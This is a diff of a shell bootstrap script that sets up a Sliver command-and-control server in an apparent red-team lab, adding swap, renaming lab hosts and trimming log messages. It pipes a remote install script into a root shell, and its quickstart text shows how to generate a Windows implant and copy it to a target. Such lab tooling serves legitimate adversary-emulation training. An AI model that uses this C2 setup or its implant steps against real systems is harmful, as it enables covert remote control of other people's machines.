@@ -15,11 +15,9 @@ C2_HEADER_NAME="${c2_header_name}"
 C2_HEADER_VALUE="${c2_header_value}"
 
 # Set hostname
-echo "[*] Setting hostname..."
 hostnamectl set-hostname sliver
 
 # Configure /etc/hosts for lab machines
-echo "[*] Configuring /etc/hosts..."
 cat >> /etc/hosts << HOSTS
 
 # redStack lab hosts
@@ -28,16 +26,14 @@ ${guacamole_private_ip}  guac
 ${mythic_private_ip}     mythic
 ${havoc_private_ip}      havoc
 ${redirector_private_ip} redirector
-${windows_private_ip}    win-operator
+${windows_private_ip}    windows
+${kali_private_ip}       kali
 HOSTS
 
 # Update system
-echo "[*] Updating system packages..."
 apt-get update
 DEBIAN_FRONTEND=noninteractive apt-get upgrade -y
 
-# Install dependencies
-echo "[*] Installing dependencies..."
 apt-get install -y \
     curl \
     git \
@@ -48,7 +44,6 @@ apt-get install -y \
     jq
 
 # Configure SSH password authentication for Guacamole access
-echo "[*] Configuring SSH authentication..."
 echo "admin:$SSH_PASSWORD" | chpasswd
 mkdir -p /home/admin
 chown admin:admin /home/admin
@@ -68,7 +63,6 @@ SSHCONF
 systemctl restart sshd
 
 # Configure UFW firewall
-echo "[*] Configuring firewall rules..."
 ufw --force reset
 ufw default deny incoming
 ufw default allow outgoing
@@ -78,28 +72,34 @@ ufw allow from $REDIRECTOR_VPC_CIDR to any port 443 proto tcp comment 'HTTPS C2 
 ufw allow 31337/tcp comment 'Sliver multiplexer'
 ufw --force enable
 
+# Add swap space — Sliver's Go compiler uses 1-2GB RAM during implant generation.
+# Without swap, t3.small exhausts memory and sshd can no longer fork, causing
+# banner-exchange hangs until reboot.
+if [ ! -f /swapfile ]; then
+    fallocate -l 2G /swapfile
+    chmod 600 /swapfile
+    mkswap /swapfile
+    swapon /swapfile
+    echo '/swapfile none swap sw 0 0' >> /etc/fstab
+    echo "[+] 2GB swap enabled"
+fi
+
 # Install Sliver C2
-echo "[*] Installing Sliver C2 framework..."
 curl https://sliver.sh/install | sudo bash
 
 # Wait for installation to complete
 sleep 10
 
 # The Sliver install script places the server binary in /root — symlink it into PATH
-echo "[*] Symlinking sliver-server into /usr/local/bin..."
 if [ -f /root/sliver-server ]; then
     ln -sf /root/sliver-server /usr/local/bin/sliver-server
-    echo "[+] sliver-server symlinked to /usr/local/bin/sliver-server"
 else
     echo "[!] WARNING: /root/sliver-server not found — install may have failed"
 fi
 
-# Verify installation
-echo "[*] Verifying Sliver installation..."
-which sliver-server && echo "[+] Sliver server binary found at $(which sliver-server)" || echo "[!] WARNING: Sliver binary not in PATH"
+which sliver-server > /dev/null || echo "[!] WARNING: Sliver binary not in PATH"
 
 # Set UMask=0022 on Sliver service so generated implants are world-readable (no chmod needed)
-echo "[*] Configuring Sliver service umask..."
 mkdir -p /etc/systemd/system/sliver.service.d/
 cat > /etc/systemd/system/sliver.service.d/umask.conf << 'UMASKCONF'
 [Service]
@@ -107,12 +107,10 @@ UMask=0022
 UMASKCONF
 
 # Ensure Sliver service is enabled and running
-echo "[*] Enabling and starting Sliver service..."
 systemctl daemon-reload
-systemctl enable sliver --now && echo "[+] Sliver service enabled and started" || echo "[!] WARNING: Could not start sliver service"
+systemctl enable sliver --now || echo "[!] WARNING: Could not start sliver service"
 
 # Wait for Sliver daemon to be ready on port 31337
-echo "[*] Waiting for Sliver daemon to be ready..."
 for i in $(seq 1 30); do
     if ss -tlnp | grep -q ':31337'; then
         echo "[+] Sliver daemon ready on port 31337"
@@ -122,26 +120,23 @@ for i in $(seq 1 30); do
     sleep 2
 done
 
-# Remove auto-generated configs from Sliver installer
-echo "[*] Removing installer-generated operator configs..."
-rm -f /home/admin/.sliver-client/configs/admin_localhost.cfg
-rm -f /root/.sliver-client/configs/root_localhost.cfg
+# Wipe all auto-generated configs from the Sliver installer so only ours exists.
+# If multiple .cfg files are present, sliver-client shows a profile picker prompt.
+rm -rf /home/admin/.sliver-client/configs/
+rm -rf /root/.sliver-client/configs/
 
-# Generate operator config for local admin access
-echo "[*] Generating operator config for operator..."
-sliver-server operator --name operator --lhost localhost --save /root/operator.cfg --permissions all
-echo "[+] Operator config saved to /root/operator.cfg"
+# Generate Sliver operator config for the admin identity (matches SSH user, lab convention)
+sliver-server operator --name admin --lhost localhost --save /root/admin.cfg --permissions all
 
 # Install config so admin can run sliver-client immediately on login
-echo "[*] Installing operator config for admin user..."
 mkdir -p /home/admin/.sliver-client/configs
-cp /root/operator.cfg /home/admin/.sliver-client/configs/operator.cfg
+cp /root/admin.cfg /home/admin/.sliver-client/configs/admin.cfg
 chown -R admin:admin /home/admin/.sliver-client
-chmod 600 /home/admin/.sliver-client/configs/operator.cfg
-echo "[+] sliver-client is ready for admin user"
+chmod 600 /home/admin/.sliver-client/configs/admin.cfg
+
+# With only one .cfg in configs/, sliver-client auto-selects it — no alias needed.
 
 # Create HTTP C2 profile with the redirector validation header pre-configured
-echo "[*] Creating redstack HTTP C2 profile..."
 jq -n \
   --arg header_name "$C2_HEADER_NAME" \
   --arg header_value "$C2_HEADER_VALUE" \
@@ -171,7 +166,6 @@ jq -n \
     }
   }' > /home/admin/redstack-c2-profile.json
 chmod 644 /home/admin/redstack-c2-profile.json
-echo "[+] C2 profile written to /home/admin/redstack-c2-profile.json"
 
 # Create operator config generation script
 cat > /root/generate_operator_config.sh << 'OPSCRIPT'
@@ -212,7 +206,7 @@ echo ""
 echo "4. Generate an implant:"
 echo "   generate --http https://REDIRECTOR_DOMAIN/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/implant.exe"
 echo ""
-echo "5. Transfer to Windows (from PowerShell on WIN-OPERATOR):"
+echo "5. Transfer to Windows (from PowerShell on windows):"
 echo "   scp admin@sliver:/tmp/implant.exe C:\Users\Administrator\Desktop\implant.exe"
 echo ""
 echo "Service status:"
@@ -223,4 +217,3 @@ QUICKSTART
 chmod +x /root/sliver_quickstart.sh
 
 echo "===== Sliver C2 Server Setup Completed $(date) ====="
-echo "===== Run /root/sliver_quickstart.sh for usage instructions ====="
